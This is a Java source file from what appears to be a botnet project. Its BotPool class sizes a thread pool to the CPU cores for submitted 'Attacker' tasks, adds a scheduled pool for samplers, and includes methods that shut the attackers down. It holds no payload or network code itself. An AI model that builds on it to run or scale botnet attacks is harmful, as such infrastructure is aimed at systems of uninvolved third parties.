/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.pool;

import com.acmutv.botnet.core.attack.Attacker;
import com.acmutv.botnet.core.pool.task.ExecutorServiceKiller;
import com.acmutv.botnet.tool.runtime.RuntimeManager;
import com.acmutv.botnet.tool.time.Duration;
import lombok.Data;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.quartz.Scheduler;

import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes bot's thread pool, both fixed and scheduled.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see ExecutorService
 */
@Data
public class BotPool {

  private static final Logger LOGGER = LogManager.getLogger(BotPool.class);

  public static final int SHUTDOWN_TIMEOUT_AMOUNT = 60;
  public static final TimeUnit SHUTDOWN_TIMEOUT_UNIT = TimeUnit.SECONDS;

  private ExecutorService attackersPool;
  private ScheduledExecutorService samplersPool;

  public BotPool() {
    int cores = RuntimeManager.getCores();
    this.attackersPool = Executors.newFixedThreadPool(cores);
    this.samplersPool = Executors.newScheduledThreadPool(1);
  }

  public void submit(Attacker attacker) {
    this.getAttackersPool().submit(attacker);
  }

  public void pause(Duration timeout) {
    LOGGER.traceEntry();
    LOGGER.traceExit();
  }

  /**
   * Kills immediately all attackers.
   */
  public void calmdown() {
    new Thread(new ExecutorServiceKiller(this.getAttackersPool(), null)).start();
  }

  /**
   * Kills all threads within the specified timeout.
   * If timeout is null, kills immediately.
   * @param timeout the shutdown timeout.
   */
  public void kill(Duration timeout) {
    new Thread(new ExecutorServiceKiller(this.getAttackersPool(), timeout)).start();
    new Thread(new ExecutorServiceKiller(this.getSamplersPool(), timeout)).start();
  }

}
